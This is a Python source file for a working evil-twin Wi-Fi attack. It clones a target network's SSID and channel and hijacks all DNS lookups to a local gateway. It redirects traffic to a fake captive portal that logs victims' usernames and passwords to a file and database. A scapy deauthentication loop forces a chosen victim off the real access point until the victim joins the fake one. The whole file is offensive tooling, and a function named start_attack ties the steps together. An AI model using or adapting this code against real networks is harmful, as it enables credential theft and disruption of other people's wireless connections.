import subprocess
import time
import shutil
import threading
import mimetypes
import urllib.parse
import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq

_deauth_stop = threading.Event()

def interface_exists(iface):
    return shutil.which("ip") and subprocess.run(
        ["ip","link","show",iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    ).returncode == 0

# ——— captive portal setup functions ———

def write_configs(ap_iface, ssid, channel, output_dir="."):
    """
    Load your two templates, replace placeholders, and write:
      - hostapd.conf: [INTERFACE NAME], [WiFi NAME], [CHANNEL NAME]
      - dnsmasq.conf: [INTERFACE NAME] + captive-DNS hijack
    """
    BASE_DIR = Path(__file__).parent
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    # 1) hostapd
    hostapd_tmpl = (BASE_DIR / "template_hostapd.conf").read_text()
    hostapd_conf = (
        hostapd_tmpl
          .replace("[INTERFACE NAME]", ap_iface)
          .replace("[WiFi NAME]", ssid)
          .replace("[CHANNEL NAME]", str(channel))
    )
    (out_dir / "hostapd.conf").write_text(hostapd_conf)
    print(f" → hostapd.conf written ({out_dir/'hostapd.conf'})")

    # 2) dnsmasq
    dnsmasq_tmpl = (BASE_DIR / "template_dnsmasq.conf").read_text()
    # replace the interface
    dnsmasq_conf = dnsmasq_tmpl.replace("[INTERFACE NAME]", ap_iface)
    # add DNS-hijack to force all lookups to .1
    dnsmasq_conf += "\n# captive-portal DNS hijack\naddress=/#/192.168.1.1\n"
    (out_dir / "dnsmasq.conf").write_text(dnsmasq_conf)
    print(f" → dnsmasq.conf written ({out_dir/'dnsmasq.conf'})")

def setup_network(ap_iface, uplink_iface="eth0"):

    # flush the interface
    subprocess.run(["ip", "addr", "flush", "dev", ap_iface], check=False)

    # bring up ap_iface as gateway .1/24
    subprocess.run(
        ["ifconfig", ap_iface, "up", "192.168.1.1", "netmask", "255.255.255.0"],
        check=True
    )
    # enable ip_forward (needed for mangle marks)
    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], check=True)

    # optional NAT out if uplink exists
    if interface_exists(uplink_iface):
        subprocess.run(
            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", uplink_iface, "-j", "MASQUERADE"],
            check=True
        )
        subprocess.run(
            ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "ACCEPT"],
            check=True
        )
    else:
        print(f"[!] Uplink '{uplink_iface}' not found—skipping NAT")

def install_iptables_captive(ap_iface):
    cmds = [
        # recreate CAPTIVE chain
        ["iptables", "-t", "nat", "-F", "CAPTIVE"],
        ["iptables", "-t", "nat", "-X", "CAPTIVE"],
        ["iptables", "-t", "nat", "-N", "CAPTIVE"],
        # skip redirect for marked clients
        ["iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", ap_iface, "-p", "tcp", "--dport", "80",
         "-m", "mark", "--mark", "1", "-j", "RETURN"],
        # redirect everyone else to portal
        ["iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", ap_iface, "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", "192.168.1.1:80"],
    ]
    for cmd in cmds:
        # never abort on iptables errors
        subprocess.run(cmd, check=False)

import subprocess
import urllib.parse
import json
import mimetypes
from pathlib import Path
from http.server import BaseHTTPRequestHandler

class CaptivePortalHandler(BaseHTTPRequestHandler):
    ap_iface = None

    def log_request(self, code='-', size='-'):
        # Override to suppress BaseHTTPRequestHandler’s default logging
        return

    # --- helpers ---
    def _add_no_cache_headers(self):
        # Strong no-cache headers to force devices to fetch a fresh portal page
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')

    def _serve_file(self, relpath):
        """
        Serve a file from /var/www/html safely (prevents ../ traversal).
        Returns True if a file was served, False otherwise.
        """
        base = Path("/var/www/html").resolve()
        # Normalize request path (strip query)
        safe_rel = Path(relpath.lstrip("/")).resolve()
        try:
            # Prevent path traversal: resolved path must start with web root
            full = (base / safe_rel).resolve()
        except Exception:
            return False

        if not str(full).startswith(str(base)) or not full.exists() or not full.is_file():
            return False

        data = full.read_bytes()
        ctype = mimetypes.guess_type(str(full))[0] or "application/octet-stream"

        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self._add_no_cache_headers()
        self.end_headers()
        self.wfile.write(data)
        return True

    def _serve_login(self):
        """
        Serve the main captive-portal page (index.html) from /var/www/html.
        If index.html is missing, return HTTP 500.
        """
        idx = Path("/var/www/html/index.html")
        if not idx.exists():
            self.send_error(500, "Portal page missing")
            return

        data = idx.read_bytes()
        # Compose response headers
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self._add_no_cache_headers()

        # tiny helper ping JS to force browsers to revalidate
        # (we inject it if index exist — you can instead bake this into the page)
        # Note: we do not alter the file contents here to keep it simple.

        self.end_headers()
        self.wfile.write(data)

    # --- request handlers ---
    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path.split("?", 1)[0]
        print(f"[GET]  {client_ip} -> {self.path}")

        # Common captive-check endpoints -> serve portal (so OS opens captive webview)
        if path in ("/generate_204", "/hotspot-detect.html", "/ncsi.txt"):
            # Serve the login page (not the expected 204) to trigger captive portal UI.
            self._serve_login()
            return

        # ping used by client-side JS to bypass caches — return 204 No Content
        if path.startswith("/__portal_ping"):
            self.send_response(204)
            self._add_no_cache_headers()
            self.end_headers()
            return

        # try to serve static file if exists under /var/www/html (images/js/css)
        if path != "/" and self._serve_file(path):
            return

        # default -> show login page (index.html)
        self._serve_login()

    def do_POST(self):
        client_ip = self.client_address[0]
        path = self.path.split("?", 1)[0]
        print(f"[POST] {client_ip} -> {self.path}")

        # Read body
        length = int(self.headers.get("Content-Length", 0))
        body_bytes = self.rfile.read(length) if length > 0 else b""
        content_type = self.headers.get("Content-Type", "")

        # Parse form-data / urlencoded
        data = {}
        try:
            if "application/x-www-form-urlencoded" in content_type:
                data = urllib.parse.parse_qs(body_bytes.decode(errors="ignore"))
                # convert list values to single values for convenience
                data = {k: v[0] if isinstance(v, list) and v else "" for k, v in data.items()}
            elif "application/json" in content_type:
                data = json.loads(body_bytes.decode(errors="ignore") or "{}")
            else:
                # fallback: try urlencoded parse anyway
                try:
                    data = urllib.parse.parse_qs(body_bytes.decode(errors="ignore"))
                    data = {k: v[0] if isinstance(v, list) and v else "" for k, v in data.items()}
                except Exception:
                    data = {}
        except Exception as e:
            print(f"  ! parse error: {e}")
            data = {}

        # Attempt to extract common fields
        username = data.get("username") or data.get("user") or data.get("email") or ""
        password = data.get("password") or data.get("pass") or data.get("pwd") or ""

        # Log to file (always)
        try:
            logline = f"{time.asctime()}\t{client_ip}\t{path}\t{username}:{password}\n"
            Path("/tmp/portal_credentials.log").write_text(
                Path("/tmp/portal_credentials.log").read_text() + logline
            )
        except Exception:
            # fallback append
            try:
                with open("/tmp/portal_credentials.log", "a") as fh:
                    fh.write(logline)
            except Exception as e:
                print(f"  ! failed to write log: {e}")

        # Try saving to sqlite via db_helper if available and CURRENT_SSID set
        try:
            try:
                from db_helper import save_credential  # noqa: E402
            except ImportError:
                save_credential = None
            # CURRENT_SSID may be defined at module level by your program; try to access it
            ssid = globals().get("CURRENT_SSID", None)
            if save_credential:
                if ssid:
                    save_credential(ssid, username, password)
                    print(f"[+] Saved to DB: SSID={ssid} username={username}")
                else:
                    # Save with blank ssid as fallback
                    save_credential("", username, password)
                    print(f"[+] Saved to DB (no SSID): username={username}")
        except Exception:
            # ignore DB errors (db_helper may not exist in your environment)
            pass

        print(f"[+] Captured from {client_ip}: user={username} pass={password}")

        # If this is the login endpoint, mark the client (so iptables mangle rule can bypass portal)
        if path in ("/login", "/login.php"):
            subprocess.run([
                "iptables", "-t", "mangle", "-A", "PREROUTING",
                "-s", client_ip, "-j", "MARK", "--set-mark", "1"
            ], check=False)
            print(f"       Marked {client_ip} as authenticated")

        # Respond: redirect to a success page if exists, else serve basic success HTML
        success_path = Path("/var/www/html/success.html")
        if success_path.exists():
            # 302 redirect to the success page (browser will load it)
            self.send_response(302)
            self.send_header("Location", "/success.html")
            self._add_no_cache_headers()
            self.end_headers()
            return
        else:
            body = b"<html><body><h1>Login successful</h1></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self._add_no_cache_headers()
            self.end_headers()
            self.wfile.write(body)
            return

def start_captive_http(ap_iface, port=80):
    CaptivePortalHandler.ap_iface = ap_iface
    server = HTTPServer(("0.0.0.0", port), CaptivePortalHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[+] Captive portal HTTP server on port {port}")
    return server

# ——— deauth code unchanged ———

def _deauth_loop(real_bssid, victim_mac, iface):
    pkt = RadioTap()/Dot11(addr1=victim_mac, addr2=real_bssid, addr3=real_bssid)/Dot11Deauth(reason=7)
    while not _deauth_stop.is_set():
        for _ in range(50):
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.1)
        time.sleep(0.5)

def deauth_victim(ap_info, victim_mac, iface):
    real_bssid = ap_info['BSSID']
    print(f"Starting deauth on {victim_mac}…")
    _deauth_stop.clear()
    t = threading.Thread(target=_deauth_loop, args=(real_bssid, victim_mac, iface), daemon=True)
    t.start()

    def assoc_filter(pkt):
        return pkt.haslayer(Dot11AssoReq) and pkt.addr2 == victim_mac

    def assoc_handler(pkt):
        print(f"→ {victim_mac} associated; stopping deauth.")
        _deauth_stop.set()

    sniff(iface=iface, prn=assoc_handler, stop_filter=assoc_filter)
    t.join()
    print(f"Deauth attack ended for {victim_mac}")

# ——— main attack startup ———

def start_attack(ap_iface, ap_info, uplink_iface="eth0", output_dir="."):
    # 1) Generate hostapd.conf & dnsmasq.conf
    write_configs(ap_iface, ap_info['SSID'], ap_info['Channel'], output_dir)

    # 2) Bring up ap_iface with IP before dnsmasq
    setup_network(ap_iface, uplink_iface)

    # 3) Launch hostapd in background (detached)
    print("Launching hostapd…")
    h = subprocess.Popen(
        ["hostapd", f"{output_dir}/hostapd.conf"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT
    )
    print(f"[+] hostapd (pid {h.pid}) started")

    # 4) Wait briefly for the interface to come up
    for i in range(5):
        time.sleep(0.5)
        link = subprocess.run(
            ["ip", "link", "show", ap_iface],
            capture_output=True
        ).stdout.decode()
        if "state UP" in link:
            break
    else:
        print(f"[!] Warning: {ap_iface} never came up")

    # 5) Launch dnsmasq in background (detached)
    print("Launching dnsmasq…")
    d = subprocess.Popen(
        ["dnsmasq", "-C", f"{output_dir}/dnsmasq.conf", "-d"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT
    )
    print(f"[+] dnsmasq (pid {d.pid}) started")

    # 6) Install iptables and start HTTP server
    install_iptables_captive(ap_iface)
    start_captive_http(ap_iface)

    return {"hostapd": h, "dnsmasq": d}